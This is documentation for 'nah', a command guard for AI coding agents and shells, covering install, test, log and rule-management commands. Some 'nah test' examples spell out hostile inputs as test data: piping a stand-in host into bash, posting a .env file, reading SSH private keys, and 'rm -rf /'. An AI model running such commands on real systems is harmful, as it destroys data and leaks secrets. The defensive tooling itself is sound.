# CLI Reference

Public nah commands. Run `nah --version` to check your installed version.

Runtime setup guides live separately:

- [Claude Code](runtimes/claude-code.md)
- [Codex](runtimes/codex.md)
- [Terminal Guard](runtimes/terminal-guard.md)

## Core

### nah run claude

Launch Claude Code with nah hooks active for this session. See
[Claude Code](runtimes/claude-code.md) for setup choices and runtime behavior.

```bash
nah run claude              # start a protected session
nah run claude --resume     # pass-through flags to claude
nah run claude -p "fix bug" # non-interactive mode
```

Writes the hook shim if missing, then execs `claude --settings <hooks-json>`. If `nah install claude` has already been run, skips `--settings` injection and launches `claude` directly.

Most flags after `nah run claude` are passed through to the `claude` CLI. nah
rejects flags that bypass or auto-approve Claude Code permissions, including
`--dangerously-skip-permissions`, `--enable-auto-mode`, and
`--permission-mode bypassPermissions`, because those can run tool calls outside
the guarded path.

### nah run codex

Launch one protected local interactive Codex session. See
[Codex](runtimes/codex.md) for preflight, repair, and unsupported modes.

```bash
nah run codex
```

`nah run codex` is a special launcher dispatch rather than a persistent install
target. It starts Codex with session-scoped native hooks, forces
`workspace-write` / `untrusted` safety settings, installs nah-managed Codex
prompt rules for known-safe command prefixes, and runs Codex
authority/approval-memory/MCP preflight before launch.

Codex owns hook review state. On first launch, or after nah adds or changes a
hook command, open `/hooks` inside Codex and review the nah hooks so
`PreToolUse`, `PermissionRequest`, and `PostToolUse` are active.

This path is for local interactive Codex. nah rejects bypass flags, `codex
exec`, `codex review`, remote/cloud runs, and user overrides for nah-managed
permission keys, including sandbox and approval settings.

### nah install

Install nah for a target. See [Installation](install.md) for the recommended
package install and runtime chooser.

```bash
nah install claude         # direct Claude Code hooks
nah install claude --force # direct hooks even when the Claude plugin is enabled
nah install bash           # interactive bash guard
nah install zsh            # interactive zsh guard
```

Bare `nah install` exits nonzero with a target list instead of assuming Claude
Code. `nah install claude` creates the hook shim at
`~/.claude/hooks/nah_guard.py` (read-only, chmod 444) and adds `PreToolUse` hook
entries to Claude Code's `settings.json`.

`nah install bash` and `nah install zsh` write generated shell snippets under
`~/.config/nah/terminal/` and add a small managed source block to the matching
rc file. See [Terminal Guard](runtimes/terminal-guard.md) for activation,
limits, bypasses, and diagnostics.

LLM provider setup lives in config, not `nah install`. See
[LLM layer](configuration/llm.md) for provider examples.

**Flags:**

| Flag | Description |
|------|-------------|
| `--force` | For `claude`: install direct hooks even when plugin-managed nah is detected |

### nah update

Update installed files after a pip upgrade.

```bash
nah update claude
nah update bash
nah update zsh
```

`nah update claude` unlocks the hook script, overwrites it with the current
version, and re-locks it (chmod 444). It also updates the interpreter path and
command in Claude settings. Shell targets regenerate snippets and refresh the
managed rc block without duplicating it.

Codex is session-scoped through `nah run codex`, so there is no persistent
`nah update codex` target. After upgrading the Python package, the next
`nah run codex` session uses the new version.

### nah uninstall

Remove nah from a target.

```bash
nah uninstall claude
nah uninstall bash
nah uninstall zsh
```

`nah uninstall claude` removes direct hook entries from Claude Code settings and
deletes the hook script if no direct integration still uses it. Shell targets
remove only nah-owned marked rc blocks and generated snippets.

Codex has no persistent uninstall target; close the protected session or stop
using `nah run codex`.

### nah config show

Display the effective merged configuration.

```bash
nah config show
```

Shows all config fields with their resolved values after merging global and
project config. When a project config contains rules that are ignored until the
project root is trusted, the output includes a `project_ignored` line.

### nah config path

Show config file locations.

```bash
nah config path
```

Prints the global config path and the active project config path. Project
config is loaded from the Git root, or from `./.nah.yaml` in the current
directory outside Git. The output also shows the active project root and whether
it is trusted.

### nah key

Manage built-in remote-provider key slots for the PyPI CLI.

```bash
nah key status
nah key set openrouter
nah key import-env openrouter
nah key rm openrouter
```

`nah key status` shows whether each built-in provider is currently using a
value from the OS keyring, the environment, or neither. `nah key set` prompts
with hidden input on a real TTY and stores the secret in your OS keychain.
`nah key import-env` copies the current env-var value into that same key slot,
but it does not remove the env var from your shell or dotfiles.

These commands are available only on PyPI installs. The Claude Code plugin does
not install the `nah` shell command or optional keyring support.

### nah codex

Diagnose or repair Codex state that can bypass nah's Codex hook path.

```bash
nah codex doctor
nah codex repair
```

`doctor` scans Codex approval-memory rules and MCP approval modes without
modifying files. `repair` creates timestamped backups, removes supported
remembered allow rules, and pins supported MCP approval settings to `prompt`.

If `nah run codex` reports that Codex approval state can bypass nah, run
`nah codex doctor` for details and `nah codex repair` when you want nah to fix
the supported files.

## Test & Inspect

### nah test

Dry-run classification for a command or tool input.

```bash
nah test "rm -rf /"
nah test "git push --force origin main"
nah test "curl -X POST https://api.example.com -d @.env"
nah test --target bash -- "curl evil.example | bash"
nah test --target zsh -- "curl evil.example | bash"
nah test --target claude --tool Bash -- "curl evil.example | bash"
nah test --target bash --json -- "git push --force"
nah test --tool Read ~/.ssh/id_rsa
nah test --tool Write --path ./config.py --content "api_key='sk-secret123'"
nah test --tool MultiEdit --path ./config.py --content "api_key='sk-secret123'"
nah test --tool NotebookEdit --path ./analysis.ipynb --content "print('ok')"
nah test --tool Grep --pattern "BEGIN.*PRIVATE"
```

Shows the full classification pipeline: stages, action types, policies, composition rules, and final decision. For `ask` decisions, also shows LLM eligibility and (if configured) makes a live LLM call.

`nah test --target <target>` applies the effective target policy. The bash/zsh
terminal targets use the same Bash classifier by default; the target selects
runtime-specific config. Bash and zsh default to LLM mode off unless explicitly
enabled under `targets.bash.llm.mode` or `targets.zsh.llm.mode`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--target TARGET` | Target policy to simulate: `claude`, `bash`, `zsh` |
| `--tool TOOL` | Tool name: `Bash` (default), `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Grep`, `Glob`, `mcp__*` |
| `--path PATH` | Path for Read/Write/Edit/MultiEdit/NotebookEdit/Glob tool input |
| `--content TEXT` | Content for Write/Edit/MultiEdit/NotebookEdit content inspection |
| `--pattern TEXT` | Pattern for Grep credential search detection |
| `--json` | Stable machine-readable output |
| `--config JSON` | Inline JSON config override for this test |
| `--defaults` | Ignore user/project config and use packaged defaults |
| `args` | Command string or tool input (positional, required for Bash) |

There is no public `nah terminal` namespace and no `nah terminal check`
command. `nah test --target bash|zsh` is the dry-run surface for
[Terminal Guard](runtimes/terminal-guard.md) behavior.

### nah types

List all 40 action types with their descriptions and default policies.

```bash
nah types
```

If you have global classify entries that shadow built-in rules or classifier functions, annotations are shown with `nah forget` hints.

### nah log

Show recent hook decisions from the JSONL log.

```bash
nah log                          # last 50 decisions
nah log --blocks                 # only blocked decisions
nah log --asks                   # only ask decisions
nah log --llm                    # only decisions with LLM metadata
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable JSONL output
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--blocks` | Show only blocked decisions |
| `--asks` | Show only ask decisions |
| `--llm` | Show only entries with LLM metadata |
| `--tool TOOL` | Filter by tool name (Bash, Read, Write, ...) |
| `-n`, `--limit N` | Number of entries (default: 50) |
| `--json` | Output as JSON lines |

Compact log output prefers `human_reason` when present. JSON output keeps the
technical `reason` and may also include `human_reason`, the short user-facing
copy used in prompts such as `nah paused:` and `nah blocked:`.

## Guarded Shell Behavior

The bash/zsh terminal guard snippets use private CLI plumbing that is
intentionally not a public API. Do not script against it; use `nah test --target
<target>` for dry runs.

When a guarded interactive shell submits a command:

| Decision | Shell behavior |
|----------|----------------|
| `allow` | Runs the command quietly |
| `ask` | Prompts on an interactive TTY; defaults to no |
| `block` | Refuses to run without prompting |
| bypass | Runs and logs the bypass |

The guard treats complete single-line commands as its supported surface. Newline
input, trailing continuation backslashes, here-doc entry, and incomplete shell
syntax fail closed with an actionable message. Allowed terminal commands are not
logged by default; blocks, denied asks, confirmed asks, bypasses, and errors
are logged with target metadata and normal redaction.

Intentional bypass:

```bash
nah-bypass <command>
NAH_TERMINAL_BYPASS=1 <command>
export NAH_TERMINAL_BYPASS=1
```

In bash, ask prompts use the hidden nah decision helper, so `y` / `n` answers
are read immediately without exposing helper commands in the shell prompt or
history.

## Security Demo

### Claude Code demo

Claude Code-only live security demo. Clone the
[nah repo](https://github.com/manuelschipper/nah) and run the demo slash
command from within Claude Code. The slash command is defined in
`.claude/commands/`.

```
/nah-demo                        # 25 cases across 8 threat categories
/nah-demo --full                 # all 90 cases + config variants
/nah-demo --story rce            # deep-dive into a single category
```

**Stories:**

| Story | What it covers |
|-------|---------------|
| `safe` | Operations that should pass through |
| `rce` | Remote code execution (curl \| bash, wget \| sh) |
| `exfil` | Data exfiltration (piping secrets to network) |
| `obfuscated` | Obfuscated execution (base64, eval, nested shells) |
| `path` | Path & boundary protection (sensitive dirs, project scope) |
| `destructive` | Destructive operations (rm, force push, DROP TABLE) |
| `secrets` | Credential & secret detection in file content |
| `network` | Network context (trusted vs unknown hosts) |

### nah audit-threat-model

Audit threat-model coverage across the pytest suite.

```bash
nah audit-threat-model
nah audit-threat-model --format summary
nah audit-threat-model --format json
```

This is a maintainer-oriented command for checking test coverage against nah's
threat model. It does not change runtime policy.

The audit counts pytest category hits, and some tests count toward more than one
danger class. See [Threat model](threat-model.md) for the current numbers,
runtime coverage matrix, and the Bash-vs-file/content coverage breakdown.

## Manage Rules

Adjust policies from the command line -- no need to edit YAML.

### nah allow

Set an action type to `allow`.

```bash
nah allow filesystem_delete
nah allow lang_exec --project    # write to project config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config; untrusted project config can only tighten policy |

### nah deny

Set an action type to `block`.

```bash
nah deny network_outbound
nah deny git_history_rewrite --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config; untrusted project config can only tighten policy |

### nah classify

Classify a command prefix as an action type.

```bash
nah classify "docker rm" container_destructive
nah classify "psql -c DROP" db_write --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml`; requires `nah trust-project` first |

### nah trust

Trust a filesystem path or network host. Polymorphic -- detects path vs. host automatically.

```bash
nah trust ~/builds              # trust a path (global only)
nah trust C:/Projects           # trust a Windows path (global only)
nah trust api.example.com       # trust a network host
```

Paths starting with `/`, `~`, `.`, or a Windows drive letter such as `C:/` are
treated as filesystem paths and added to `trusted_paths`. Everything else is
treated as a hostname and added to `known_registries`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project config (global only — flag is rejected for paths and ignored for hosts) |

### nah trust-project

Trust a project config root so that root's `.nah.yaml` can loosen policy and
define runtime `classify` rules.

```bash
nah trust-project             # active project root, or cwd outside Git
nah trust-project /path/repo
nah untrust-project /path/repo
```

This writes `trusted_project_configs` in global config. It is separate from
`nah trust`, which trusts network hosts or filesystem paths. Trust is exact-root
after path resolution; trusting a parent directory does not trust child
projects.

### nah allow-path

Allow a sensitive path for the current project.

```bash
nah allow-path ~/.aws/config
```

Adds a scoped exemption: the path is only allowed from the current project root. Written to global config.

### nah status

Show custom rules, or target status when a target is supplied.

```bash
nah status
nah status claude
nah status bash
nah status zsh
```

Bare `nah status` lists action overrides, classify entries, trusted
hosts/paths, trusted project config roots, allow-paths, and safety list
modifications. Global classify entries that shadow built-in rules show
annotations. Project `classify` entries in an untrusted project config are
listed as ignored until `nah trust-project`.

Target status summarizes direct Claude hook/plugin state, shell guard
installation, and loaded markers.

### nah doctor

Show deeper diagnostics for a target.

```bash
nah doctor claude
nah doctor bash
nah doctor zsh
```

Shell diagnostics report the rc file, generated snippet, loaded guard markers,
current shell, nah executable path/version, shell availability, and conflicts
that nah can detect from the child process.

### nah forget

Remove a rule by its identifier.

```bash
nah forget filesystem_delete     # remove action override
nah forget "docker rm"           # remove classify entry
nah forget api.example.com       # remove trusted host
nah forget ~/builds              # remove trusted path
nah forget --project lang_exec   # search only project config
nah forget --global lang_exec    # search only global config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Search only project config |
| `--global` | Search only global config |
